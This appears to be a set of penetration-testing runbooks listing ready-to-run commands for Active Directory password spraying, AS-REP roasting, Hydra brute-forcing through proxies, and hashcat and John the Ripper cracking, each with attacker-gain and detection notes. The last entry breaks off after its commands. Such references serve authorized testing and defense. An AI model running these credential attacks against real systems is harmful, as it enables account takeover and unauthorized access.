label: AD Domain Password Spray Workflow
command:
crackmapexec <IP> -u 'user' -p 'password' --pass-pol
crackmapexec smb <IP> -u users.txt -p passwords.txt
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' --continue-on-success --no-bruteforce --shares
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
env NEWPASS='P@ssw0rd!2025#' ; netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
description:
This runbook executes lockout-aware Active Directory password spraying and user validation using #crackmapexec, #netexec, and #kerbrute. It prioritizes policy reconnaissance, low-noise username discovery, and controlled auth checks.

It also includes a takeover path for accounts in `STATUS_PASSWORD_MUST_CHANGE` state, where an operator with appropriate rights may set a known password and validate access.

  1. Enumerate policy/users: discover lockout policy and candidate user list safely.
  2. Run controlled spray: test one/few passwords across many users with anti-lockout pacing.
  3. Validate edge-account states: handle must-change-password scenarios and confirm resulting access.
  • Tool Location/Source: #crackmapexec/#netexec (Kali offensive toolset), #kerbrute binary for Kerberos user validation/spraying.
  • Attack pre-requisite: network reachability to AD services on TCP 445/88, domain context, and an authorized assessment scope.
  • What attacker gain: valid domain credentials, account state intelligence, and potential foothold for lateral movement.
  • Detection/Defense opsec: monitor failed-auth bursts, enforce smart lockout, deploy MFA/Conditional Access, and alert on abnormal SMB/Kerberos authentication patterns.

Core Commands:

crackmapexec <IP> -u 'user' -p 'password' --pass-pol
crackmapexec smb <IP> -u users.txt -p passwords.txt
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' --continue-on-success --no-bruteforce --shares
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
env NEWPASS='P@ssw0rd!2025#' ; netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol

label: AS REP Roasting to Offline Crack
command:
python GetNPUsers.py <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
python GetNPUsers.py <DOMAIN>/<USER>:<PASS> -request -format hashcat -outputfile hashes.asreproast
ASRepCatcher relay -dc $DC_IP
ASRepCatcher relay -dc $DC_IP --disable-spoofing
ASRepCatcher listen
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt
description:
This runbook targets Kerberos accounts configured without pre-authentication by extracting AS-REP responses and cracking them offline. It supports direct extraction with #GetNPUsers.py and traffic-capture approaches via #ASRepCatcher.

Recovered AS-REP material is then cracked with #john or #hashcat -m 18200, enabling credential recovery without online brute-force noise.

  1. Collect roastable responses: request AS-REP for users with preauth disabled or capture via relay/listen workflows.
  2. Normalize output format: export in hashcat-compatible form for reliable cracking tooling.
  3. Run offline cracking: execute wordlist/rule attacks against AS-REP ciphertext material.
  • Tool Location/Source: #GetNPUsers.py (Impacket), #ASRepCatcher, #hashcat, #john.
  • Attack pre-requisite: target accounts with `DONT_REQ_PREAUTH` behavior or capture position to observe AS-REQ/AS-REP exchanges on TCP/UDP 88.
  • What attacker gain: recoverable Kerberos credential material leading to domain account compromise.
  • Detection/Defense opsec: disable preauth-disabled account configurations, monitor abnormal AS-REQ patterns, enforce strong password policy and MFA where applicable.

Core Commands:

python GetNPUsers.py <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
python GetNPUsers.py <DOMAIN>/<USER>:<PASS> -request -format hashcat -outputfile hashes.asreproast
ASRepCatcher relay -dc $DC_IP
ASRepCatcher relay -dc $DC_IP --disable-spoofing
ASRepCatcher listen
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt

label: Combinator and Inline Rule Chaining
command:
hashcat -a 1 -m 1000 hashes.ntlm wordlist1.txt wordlist2.txt
hashcat -a 1 -m 1000 hashes.ntlm wordlist1.txt wordlist2.txt -j '$-' -k '$!'
hashcat --stdout -r 123.rule -r abc.rule wordlist.txt
description:
This runbook expands candidate quality by combining two wordlists and mutating left/right sides independently. It targets real-world password construction where users concatenate meaningful tokens (e.g., season + project, company + year).

Using #hashcat -a 1 with #-j/#-k rule chaining produces richer candidates than single-dictionary runs while remaining cheaper than full brute-force.

  1. Prepare segmented wordlists: split likely roots into two corpora (org terms, leaked words, pattern components).
  2. Generate pairwise combinations: combinator mode creates candidate joins across left and right lists.
  3. Apply side-specific mutations: prepend/append transforms on each side emulate common composition behaviors.
  • Tool Location/Source: #hashcat plus local rules in `docs/sources-runbooks/password-cracking/hashcat/`.
  • Attack pre-requisite: two meaningful wordlists derived from target context and validated hash mode from triage stage.
  • What attacker gain: improved recovery of structured passwords missed by simple dictionary runs.
  • Detection/Defense opsec: enforce passphrase complexity and deny predictable concatenation patterns; rotate exposed passwords quickly after incidents.

Core Commands:

hashcat -a 1 -m 1000 hashes.ntlm wordlist1.txt wordlist2.txt
hashcat -a 1 -m 1000 hashes.ntlm wordlist1.txt wordlist2.txt -j '$-' -k '$!'
hashcat --stdout -r 123.rule -r abc.rule wordlist.txt

label: GetADUsers Metadata Enumeration Workflow
command:
GetADUsers.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10
GetADUsers.py corp.local/jdoe:'Passw0rd!' -user alice -dc-host dc01.corp.local
GetADUsers.py corp.local/ -all -k -no-pass -dc-ip 10.0.0.10
description:
This runbook uses Impacket #GetADUsers.py to enumerate AD user metadata (for example `pwdLastSet`, `lastLogon`, `mail`) before spraying. It improves target prioritization and campaign ordering.

By identifying stale/inactive patterns and account attributes, operators can select lower-risk/high-probability username cohorts for controlled credential testing.

  1. Query broad user metadata: collect baseline user details from domain controller.
  2. Scope to specific users when needed: pull focused records for targeted assessments.
  3. Prioritize spray plan: rank candidate users and schedule low-noise authentication checks.
  • Tool Location/Source: Impacket example #GetADUsers.py.
  • Attack pre-requisite: domain reachability on LDAP/Kerberos paths (for example TCP 389/88) and valid auth context or Kerberos ticket options.
  • What attacker gain: improved user-target intelligence and higher-efficiency spray sequencing.
  • Detection/Defense opsec: monitor abnormal LDAP query behavior, least-privilege directory access, and correlate metadata harvesting with subsequent auth attempts.

Core Commands:

GetADUsers.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10
GetADUsers.py corp.local/jdoe:'Passw0rd!' -user alice -dc-host dc01.corp.local
GetADUsers.py corp.local/ -all -k -no-pass -dc-ip 10.0.0.10

label: Haiti Wrapper Guided Mode Selection
command:
hashcat-haiti -e d41d8cd98f00b204e9800998ecf8427e -- hashes.txt /usr/share/wordlists/passwords/rockyou.txt -r /usr/share/doc/hashcat/rules/best64.rule
john-haiti -e d41d8cd98f00b204e9800998ecf8427e -- hashes.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt
haiti-fzf hc -e d41d8cd98f00b204e9800998ecf8427e
haiti-parsable jtr d41d8cd98f00b204e9800998ecf8427e
description:
This runbook accelerates hash-type-to-tool mapping using Haiti wrappers that bridge identification with launch-ready Hashcat or John command scaffolding. It reduces operator mistakes when facing ambiguous hash material.

Wrappers such as #hashcat-haiti, #john-haiti, #haiti-fzf, and #haiti-parsable support faster workflow startup and automation-friendly selection paths.

  1. Identify and select mode: run Haiti wrappers on sample hash material to map valid mode/format options.
  2. Launch cracking workflow: pass cracking arguments directly through wrapper chain.
  3. Integrate with automation: use parsable output or fzf-driven selection for scripted pipelines.
  • Tool Location/Source: #haiti suite binaries (`haiti`, `hashcat-haiti`, `john-haiti`, `haiti-fzf`, `haiti-parsable`).
  • Attack pre-requisite: sample hash line and installed backend cracking tool (#hashcat or #john).
  • What attacker gain: faster and more accurate launch into correct cracking mode/format, lowering setup errors.
  • Detection/Defense opsec: triage speed means defenders have less response time once hashes leak; immediate credential revocation is critical.

Core Commands:

hashcat-haiti -e d41d8cd98f00b204e9800998ecf8427e -- hashes.txt /usr/share/wordlists/passwords/rockyou.txt -r /usr/share/doc/hashcat/rules/best64.rule
john-haiti -e d41d8cd98f00b204e9800998ecf8427e -- hashes.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt
haiti-fzf hc -e d41d8cd98f00b204e9800998ecf8427e
haiti-parsable jtr d41d8cd98f00b204e9800998ecf8427e

label: Hash Type Triage and Mode Mapping
command:
haiti -e '<hash>'
hashcat --identify my.hash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
description:
Hash triage is the first decision gate in any credential attack workflow: before burning CPU/GPU time, the operator must accurately map raw hash material to the correct cracking engine format and mode ID.

This runbook uses #haiti, #hashcat, and format examples to resolve ambiguity (e.g., 32-hex collisions between MD5-like families, NetNTLMv2 vs NTLM, Kerberos variants). Correct mapping prevents false negatives caused by running valid candidates against the wrong parser.

  1. Ingest hash material: collect one or more sample lines from dump artifacts (SAM/NTDS, responder captures, ticket extractions, app databases).
  2. Classify candidates: run #haiti and #hashcat --identify to enumerate plausible types.
  3. Resolve to execution mode: validate against #hashcat --example-hashes and lock the final mode/format for downstream cracking runbooks.
  • Tool Location/Source: #haiti (hash identification utility; commonly installed on Kali or via upstream package managers), #hashcat (`/usr/bin/hashcat` on typical Kali installs), and local hashcat documentation/examples in this profile source set.
  • Attack pre-requisite: access to captured hash material and enough context to distinguish transport/auth protocol (e.g., SMB challenge-response vs local account database hash).
  • What attacker gain: a validated cracking strategy (correct mode, parser, and candidate-generation path), dramatically reducing wasted cycles and bad assumptions.
  • Detection/Defense opsec: monitor and alert on hash dumping precursors (LSASS access, SAM/NTDS extraction, Responder/relay artifacts); harden credential surfaces with MFA, strong password policy, and protocol hardening (SMB signing, disable legacy auth where feasible).

Core Commands:

haiti -e '<hash>'
hashcat --identify my.hash
hashcat --example-hashes | grep -B1 -A2 "NTLM"

label: Hashcat Association Mode 9 Expansion
command:
hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best66.rule
hashcat -a 9 -m 500 example500.hash 1word.dict --speed-only
description:
This runbook uses hashcat attack-mode 9 to execute association-style candidate generation with optional rule amplification. It is positioned as an advanced alternative when classic straight/combinator modes underperform for linked candidate patterns.

Mode 9 can be benchmarked quickly and integrated into phased cracking plans after baseline dictionary/rules attacks.

  1. Launch association mode: run mode 9 with an appropriate base word source.
  2. Amplify with rules: apply selected rulesets to widen associated candidate variants.
  3. Measure viability: validate speed and crack yield before large-scale runtime commitment.
  • Tool Location/Source: #hashcat attack-mode 9 support in standard help/examples.
  • Attack pre-requisite: correctly identified hash mode and suitable source dictionary for association expansion.
  • What attacker gain: extra coverage on candidate families not well-served by baseline attack modes.
  • Detection/Defense opsec: association strategies exploit predictable credential semantics; strong randomized passphrases remain primary control.

Core Commands:

hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best66.rule
hashcat -a 9 -m 500 example500.hash 1word.dict --speed-only

label: Hashcat Mode 8 Feed Integration
command:
hashcat -m 0 example0.hash -a 8 feeds/feed_wordlist.so example.dict
hashcat -a 8 -m 500 example500.hash feeds/feed_wordlist.so 1word.dict -r rules/best66.rule
hashcat -a 8 -m 0 example0.hash feeds/feed_wordlist.so example.dict --keyspace
description:
This runbook uses hashcat attack-mode 8 to inject custom password candidate generators (feeds) while retaining core hashcat scheduling and reporting controls. It is useful when advanced candidate logic outgrows standard attack modes.

With #-a 8, the first positional argument is a feed plugin (for example #feeds/feed_wordlist.so), and subsequent loose parameters are passed to that feed.

  1. Select feed plugin: choose generator implementation aligned to candidate strategy.
  2. Pass feed parameters: provide wordlists or generator-specific args after plugin path.
  3. Leverage native controls: use keyspace/progress/speed/rules with feed-driven generation.
  • Tool Location/Source: #hashcat with attack-mode 8 feed support and feed binaries in the local hashcat distribution.
  • Attack pre-requisite: compatible feed plugin, correct target hash mode, and validated feed argument syntax.
  • What attacker gain: higher-flexibility candidate generation and improved integration with distributed cracking workflows.
  • Detection/Defense opsec: feed customization increases attacker adaptability; defensive focus remains rapid credential invalidation and hardening against initial hash theft.

Core Commands:

hashcat -m 0 example0.hash -a 8 feeds/feed_wordlist.so example.dict
hashcat -a 8 -m 500 example500.hash feeds/feed_wordlist.so 1word.dict -r rules/best66.rule
hashcat -a 8 -m 0 example0.hash feeds/feed_wordlist.so example.dict --keyspace

label: Hashcat Benchmark and Backend Profiling
command:
hashcat -b -m 1000
hashcat -b --benchmark-all
hashcat -I
hashcat -m 1000 hashes.ntlm wordlist.txt --speed-only
hashcat -m 1000 hashes.ntlm wordlist.txt --progress-only
description:
This runbook establishes cracking performance baselines and backend capability visibility before launching expensive jobs. It reduces planning errors by measuring expected throughput and device readiness up front.

It uses #hashcat -b, backend inspection via #-I, and quick speed/progress estimators to size runtime windows and attack sequencing.

  1. Benchmark representative modes: measure realistic speed for target hash families.
  2. Inspect backend health: verify available devices, runtime, and acceleration context.
  3. Estimate campaign runtime: use speed/progress-only checks to allocate cracking phases safely.
  • Tool Location/Source: #hashcat benchmark and backend options in standard release builds.
  • Attack pre-requisite: selected hash mode set and available GPU/CPU devices for benchmarking.
  • What attacker gain: higher campaign efficiency, better keyspace planning, fewer stalled or unrealistic cracking runs.
  • Detection/Defense opsec: accelerate credential reset timelines; once hash artifacts are exposed, attacker throughput can be rapidly optimized.

Core Commands:

hashcat -b -m 1000
hashcat -b --benchmark-all
hashcat -I
hashcat -m 1000 hashes.ntlm wordlist.txt --speed-only
hashcat -m 1000 hashes.ntlm wordlist.txt --progress-only

label: Hashcat Keyspace Partition and Slicing
command:
hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d --keyspace
hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d --total-candidates
hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d -s 0 -l 50000000
hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d -s 50000000 -l 50000000
description:
This runbook splits large candidate spaces into deterministic chunks for distributed workers, phased campaigns, or resumable batch execution. It prevents overlap and enables controlled parallelism.

Using #--keyspace, #--total-candidates, #--skip, and #--limit, operators can assign exact ranges to separate cracking nodes.

  1. Measure candidate universe: calculate keyspace and total candidate count for the chosen attack.
  2. Define non-overlapping slices: assign skip/limit offsets per worker.
  3. Aggregate outcomes: merge cracked outputs and track unresolved ranges for reprocessing.
  • Tool Location/Source: #hashcat keyspace and slicing flags in standard builds.
  • Attack pre-requisite: deterministic attack definition (mask/wordlist/rule settings) shared by all workers.
  • What attacker gain: faster wall-clock completion and cleaner orchestration for very large cracking jobs.
  • Detection/Defense opsec: distributed cracking compresses time-to-crack; defenders should prioritize immediate credential invalidation and MFA enforcement after compromise.

Core Commands:

hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d --keyspace
hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d --total-candidates
hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d -s 0 -l 50000000
hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?d -s 50000000 -l 50000000

label: Hashcat Session and Recovery Workflow
command:
hashcat --session=corp_ntlm_q1 -a 0 -m 1000 hashes.ntlm wordlist.txt -r rules/best66.rule
hashcat --session=corp_ntlm_q1 --restore
hashcat --status --status-timer=1 --session=corp_ntlm_q1
hashcat -m 1000 hashes.ntlm --show
hashcat -m 1000 hashes.ntlm --left
description:
This runbook operationalizes long cracking jobs with recoverability, live telemetry, and deterministic post-run triage. It is mandatory for stable enterprise-scale cracking where interruptions and phased campaigns are expected.

It uses named sessions (#--session), resume controls (#--restore), status monitoring, and result splitting via #--show/#--left.

  1. Launch named campaign: run cracking jobs with a unique session identifier and stable input artifacts.
  2. Monitor and recover: poll status and resume exactly from checkpoint if interrupted.
  3. Split outcomes: export cracked vs uncracked lists for reporting and follow-on attacks.
  • Tool Location/Source: #hashcat session manager (`--session`, `--restore`, `--status`) in standard builds.
  • Attack pre-requisite: valid cracking task prepared (hash mode, attack mode, candidate sources).
  • What attacker gain: reliable campaign continuity and cleaner phase-based decision making for unresolved hash material.
  • Detection/Defense opsec: incident response should assume resumed cracking capability after workstation interruptions; immediate credential rotation remains critical once leak is confirmed.

Core Commands:

hashcat --session=corp_ntlm_q1 -a 0 -m 1000 hashes.ntlm wordlist.txt -r rules/best66.rule
hashcat --session=corp_ntlm_q1 --restore
hashcat --status --status-timer=1 --session=corp_ntlm_q1
hashcat -m 1000 hashes.ntlm --show
hashcat -m 1000 hashes.ntlm --left

label: Hydra JSON Output and Restore Ops
command:
hydra -L users.txt -P passlist.txt ssh://target -o results.txt -b text
hydra -L users.txt -P passlist.txt http-post-form://target -o results.json -b jsonv1
hydra -R
description:
This runbook standardizes Hydra result handling with file output formats (`text`, `jsonv1`) and session recovery using restore files. It is essential for long-running campaigns and automation pipelines.

Operators can export machine-readable evidence for downstream parsing while preserving resumability through #hydra -R.

  1. Run with explicit output format: save findings to structured file for reliable ingestion.
  2. Capture campaign state: leverage built-in restore file behavior for interruption resilience.
  3. Resume from checkpoint: continue aborted scans without restarting full attempt set.
  • Tool Location/Source: #hydra output options (`-o`, `-b`) and restore option (`-R`).
  • Attack pre-requisite: configured credential campaign and writable output location.
  • What attacker gain: durable evidence artifacts and reduced operational loss during interruptions.
  • Detection/Defense opsec: rapid lockout/MFA response still needed; resumable attacker workflows reduce defender benefit from transient service interruptions.

Core Commands:

hydra -L users.txt -P passlist.txt ssh://target -o results.txt -b text
hydra -L users.txt -P passlist.txt http-post-form://target -o results.json -b jsonv1
hydra -R

label: Hydra Proxy Routed Attack Workflow
command:
HYDRA_PROXY_HTTP="http://123.45.67.89:8080/" hydra -L users.txt -P pass.txt http-get://target
HYDRA_PROXY_HTTP="proxylist.txt" hydra -L users.txt -P pass.txt http-post-form://target
HYDRA_PROXY=connect://proxy.anonymizer.com:8000 hydra -L users.txt -P pass.txt ssh://target
HYDRA_PROXY=socks4://auth:pw@127.0.0.1:1080 hydra -L users.txt -P pass.txt rdp://target
description:
This runbook routes Hydra authentication testing through HTTP/SOCKS/CONNECT proxies for segmented network access, egress control, or relay-chain operational constraints.

Proxy behavior is controlled with environment variables such as #HYDRA_PROXY_HTTP and #HYDRA_PROXY, supporting inline endpoints or proxy list files.

  1. Define proxy transport path: choose HTTP-only proxy path or generic transport proxy depending on target protocol.
  2. Run credential checks through proxy: execute Hydra modules while preserving original testing logic.
  3. Rotate or pool proxies: use list files for resilient routing and distributed campaigns.
  • Tool Location/Source: #hydra plus proxy environment variable support in official README/man docs.
  • Attack pre-requisite: reachable proxy infrastructure and permitted authorized testing scope.
  • What attacker gain: network reach to otherwise inaccessible targets and operational flexibility for credential testing.
  • Detection/Defense opsec: monitor auth failures from atypical egress paths, enforce MFA, and detect proxy-origin abuse patterns.

Core Commands:

HYDRA_PROXY_HTTP="http://123.45.67.89:8080/" hydra -L users.txt -P pass.txt http-get://target
HYDRA_PROXY_HTTP="proxylist.txt" hydra -L users.txt -P pass.txt http-post-form://target
HYDRA_PROXY=connect://proxy.anonymizer.com:8000 hydra -L users.txt -P pass.txt ssh://target
HYDRA_PROXY=socks4://auth:pw@127.0.0.1:1080 hydra -L users.txt -P pass.txt rdp://target

label: Hydra Online Credential Attack Workflow
command:
hydra -l admin -p password ftp://target/
hydra -L logins.txt -P passwords.txt ftp://target/
hydra -L users.txt -P passwords.txt -e snr ssh://target/
hydra -C default_accounts.txt ftp://target/
hydra -l ftp -x 3:3:a ftp://target/
hydra -U http-post-form
hydra -l test -p test -m PLAIN imap://127.0.0.1/PLAIN
hydra -M targets.txt -L users.txt -p 'Winter2025!' -u -t 4 ssh
hydra -R
description:
This runbook covers online authentication testing using #hydra across single-host and multi-host services with support for dictionaries, username-password pairs, module options, brute charset generation, and session recovery.

It is typically used in authorized assessments to validate weak credential exposure, lockout thresholds, and service-specific authentication hardening on protocols such as FTP, SSH, IMAP, HTTP forms, and RDP.

  1. Define target protocol and auth model: choose module and credential input mode (`-l/-p`, `-L/-P`, `-C`, `-x`).
  2. Control spray behavior: tune user/password ordering, parallelism, and module-specific arguments to minimize lockout impact.
  3. Persist and recover: export findings and resume interrupted sessions with restore support.
  • Tool Location/Source: #hydra (typically `/usr/bin/hydra` on Kali), module help via #hydra -U <module>.
  • Attack pre-requisite: reachable target service on relevant TCP ports, authorized test scope, and candidate credential sources.
  • What attacker gain: valid credential pairs enabling authenticated access, lateral movement, or privilege escalation paths.
  • Detection/Defense opsec: enforce MFA, lockout/rate-limits, geo/device anomaly checks, and SIEM alerts on repeated auth failures across services.

Core Commands:

hydra -l admin -p password ftp://target/
hydra -L logins.txt -P passwords.txt ftp://target/
hydra -L users.txt -P passwords.txt -e snr ssh://target/
hydra -C default_accounts.txt ftp://target/
hydra -l ftp -x 3:3:a ftp://target/
hydra -U http-post-form
hydra -l test -p test -m PLAIN imap://127.0.0.1/PLAIN
hydra -M targets.txt -L users.txt -p 'Winter2025!' -u -t 4 ssh
hydra -R

label: Hydra Wordlist Hygiene and Filtering
command:
cat words.txt | sort | uniq > dictionary.txt
cat dictionary.txt | pw-inspector -m 6 -c 2 -n > passlist.txt
hydra -L users.txt -P passlist.txt -u -t 4 ssh://target
description:
This runbook optimizes online spray quality by deduplicating dictionaries and applying policy-aware password filters before running Hydra. It reduces noise, improves hit ratio, and lowers lockout risk.

The pre-processing pipeline uses shell sort/uniq plus #pw-inspector constraints (minimum length/class requirements) before execution in #hydra.

  1. Normalize candidate set: remove duplicate passwords from raw dictionaries.
  2. Apply policy filters: retain only candidates matching known organization policy constraints.
  3. Execute controlled spray: run Hydra with reduced, high-probability candidate list.
  • Tool Location/Source: shell utilities (`sort`, `uniq`), #pw-inspector, and #hydra.
  • Attack pre-requisite: initial dictionary source and known/estimated target password policy characteristics.
  • What attacker gain: improved online credential discovery efficiency with fewer wasted attempts.
  • Detection/Defense opsec: enforce MFA and behavioral detection; policy-aware sprays are lower noise and may evade naive threshold-only monitoring.

Core Commands:

cat words.txt | sort | uniq > dictionary.txt
cat dictionary.txt | pw-inspector -m 6 -c 2 -n > passlist.txt
hydra -L users.txt -P passlist.txt -u -t 4 ssh://target

label: JTR SSH Key Conversion Crack
command:
ssh2john.py id_rsa > ssh.hash
john ssh.hash
description:
This runbook converts passphrase-protected SSH private keys into John-compatible hash format and executes offline cracking. It is a focused credential-recovery path for stolen or recovered SSH key files.

The workflow is minimal: parse key material with #ssh2john.py, then run #john against the generated hash output.

  1. Extract crackable hash: transform private key metadata into JtR input format.
  2. Run offline candidate attack: apply default or explicit wordlist/rule cracking strategy.
  3. Validate recovered passphrase: test recovered secret against target SSH key usage path.
  • Tool Location/Source: #ssh2john.py (John jumbo tools) and #john.
  • Attack pre-requisite: access to encrypted private key file(s) and legal authorization for cracking attempt.
  • What attacker gain: SSH key passphrase leading to direct private key operational use.
  • Detection/Defense opsec: protect key files, enforce hardware-backed keys where possible, rotate compromised keys, and monitor anomalous SSH authentications on TCP 22.

Core Commands:

ssh2john.py id_rsa > ssh.hash
john ssh.hash

label: John Candidate Dedupe Preprocessing
command:
john --wordlist=all.lst --rules --stdout | unique mangled.lst
john --wordlist=mangled.lst mypasswd
john --wordlist=all.lst --rules --stdout=8 | unique mangled8.lst
john --wordlist=mangled8.lst mypasswd
description:
This runbook pre-generates John rule-expanded candidates and deduplicates them before cracking. It is useful when slow hash formats make duplicate candidate attempts expensive.

By piping #john --stdout into #unique, operators trade disk usage for reduced redundant candidate processing.

  1. Generate mutated candidates: use John rules to expand base dictionaries.
  2. Deduplicate stream: remove repeated candidates while preserving order.
  3. Replay optimized list: run cracking against deduped candidate files.
  • Tool Location/Source: #john and companion utility #unique in JtR runtime/toolset.
  • Attack pre-requisite: hash file, baseline wordlist, and selected ruleset.
  • What attacker gain: lower redundant processing overhead and better performance consistency on slow hash targets.
  • Detection/Defense opsec: random, non-reused passphrases reduce the value of precomputed mutation campaigns.

Core Commands:

john --wordlist=all.lst --rules --stdout | unique mangled.lst
john --wordlist=mangled.lst mypasswd
john --wordlist=all.lst --rules --stdout=8 | unique mangled8.lst
john --wordlist=mangled8.lst mypasswd

label: John Incremental Charset Engineering
command:
john -inc=digits mypasswd
john --make-charset=custom.chr mypasswd
john --make-charset=custom.chr passwd1 passwd2
john -inc=custom passwd3
john --make-charset=my_alpha.chr --external=filter_alpha mypasswd
description:
This runbook builds custom charset profiles from recovered plaintexts and runs incremental attacks tuned to target-specific character distributions. It is designed for deep cracking phases after initial dictionary/rule passes.

It combines #--make-charset with #--incremental modes (including #digits) to optimize candidate ordering.

  1. Generate charset model: derive character frequency profiles from cracked sets or selected files.
  2. Run targeted incremental modes: start with low-entropy modes such as digits, then custom charsets.
  3. Iterate from new cracks: refresh charset model as new plaintexts are recovered.
  • Tool Location/Source: #john charset generation and incremental mode features.
  • Attack pre-requisite: seed plaintext corpus (potfile or cracked files), target hash set, and runtime tolerance for incremental search.
  • What attacker gain: better candidate ordering and increased late-phase crack success compared to generic brute-force.
  • Detection/Defense opsec: long unique passphrases resist incremental modeling; credential rotation disrupts iterative attacker feedback.

Core Commands:

john -inc=digits mypasswd
john --make-charset=custom.chr mypasswd
john --make-charset=custom.chr passwd1 passwd2
john -inc=custom passwd3
john --make-charset=my_alpha.chr --external=filter_alpha mypasswd

label: John JSON Format Triage Mapping
command:
john --show=formats hashes.txt
john --show=formats hashes.txt | json_pp
john --show=formats hashes.txt | python -c 'import json, sys, pprint; pprint.pprint(json.load(sys.stdin))'
john --format=raw-md5 hashes.txt --show=formats
description:
This runbook uses John `--show=formats` JSON output to classify mixed hash files, validate parser compatibility, and understand canonical hash transformations used in pot matching.

It supports machine parsing and pretty-print workflows using #json_pp or Python, making it useful for automated intake pipelines and format troubleshooting.

  1. Parse input hashes as JSON metadata: inspect line-by-line format possibilities.
  2. Constrain and validate format assumptions: scope checks with explicit format filters.
  3. Map canonical representation: align source hashes with potfile canonical forms for reliable match logic.
  • Tool Location/Source: #john --show=formats, plus optional #json_pp and Python JSON tooling.
  • Attack pre-requisite: hash file(s) requiring format disambiguation or parser validation.
  • What attacker gain: fewer parser mismatches, cleaner automation, and reliable canonical hash handling.
  • Detection/Defense opsec: no direct exploit vector here; this stage improves attacker workflow quality once hash data is already exposed.

Core Commands:

john --show=formats hashes.txt
john --show=formats hashes.txt | json_pp
john --show=formats hashes.txt | python -c 'import json, sys, pprint; pprint.pprint(json.load(sys.stdin))'
john --format=raw-md5 hashes.txt --show=formats

label: John Mask and Incremental Hybrid
command:
john --mask='?a' --min-length=1 --max-length=8 hashes.txt
john --wordlist=word.lst --rules=jumbo --mask='?w?d?d?d' hashes.txt
john --incremental=digits --mask='?w?d?d?d' hashes.txt
description:
This runbook chains John mask attacks with incremental generators and wordlist hybrids for controlled candidate expansion. It is effective when password shape is partially known and full brute-force is too expensive.

It combines #john --mask with #--incremental=digits and optional wordlist/rule pre-seeding to cover structured candidate space in priority order.

  1. Define structural mask: encode known shape assumptions into JtR mask tokens.
  2. Apply hybrid with seeded words: combine root words and digit tails where applicable.
  3. Expand with incremental digits mode: let John fill unknown ranges under controlled complexity.
  • Tool Location/Source: #john jumbo build/runtime with mask support.
  • Attack pre-requisite: target hash file, known/assumed password pattern, and optional wordlist for hybrid seeding.
  • What attacker gain: improved coverage for patterned passwords without paying full random keyspace cost.
  • Detection/Defense opsec: require long passphrases and block simplistic pattern constructions (word+digits); rotate credentials on compromise indicators.

Core Commands:

john --mask='?a' --min-length=1 --max-length=8 hashes.txt
john --wordlist=word.lst --rules=jumbo --mask='?w?d?d?d' hashes.txt

label: John Rules and Loopback Workflow
command:
john --wordlist=words.txt --rules hashes.txt
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated_all.txt
john --loopback --rules hashes.txt
john --loopback --rules=none hashes.txt
john --session=corp_jtr --wordlist=words.txt --rules hashes.txt
john --status=corp_jtr
john --restore=corp_jtr
description:
This runbook uses John the Ripper for rule-driven candidate generation, loopback reuse of recovered passwords, and resumable session control. It is effective when iterative mutation campaigns are needed across large hash sets.

Core operations include #john --wordlist --rules, candidate preview through #--stdout, and potfile recycling with #--loopback.

  1. Run rule-mutated wordlist attack: apply selected rulesets to generate high-probability variants.
  2. Preview and tune candidates: inspect generated candidates in stdout mode before expensive runs.
  3. Recycle known plaintexts: use loopback to mutate already-cracked passwords and discover adjacent credentials.
  • Tool Location/Source: #john (`/usr/sbin/john` or local jumbo build path), potfile and session files from standard John runtime.
  • Attack pre-requisite: valid hash file, wordlist, and chosen ruleset; optional existing potfile data for loopback mode.
  • What attacker gain: expanded crack coverage via adaptive mutation and cross-account password reuse discovery.
  • Detection/Defense opsec: eliminate password reuse across accounts, enforce MFA, and apply high-entropy policies to reduce loopback mutation success.

Core Commands:

john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated_all.txt
john --loopback --rules hashes.txt
john --loopback --rules=none hashes.txt

label: John Shell User Salt Scope Reduction
command:
john --wordlist=all.lst --rules --shells=sh,csh,tcsh,bash mypasswd
john --wordlist=all.lst --rules --users=0 *passwd*
john --wordlist=all.lst --rules --users=-root,solar *passwd*
john --wordlist=all.lst --rules --salts=2 *passwd*
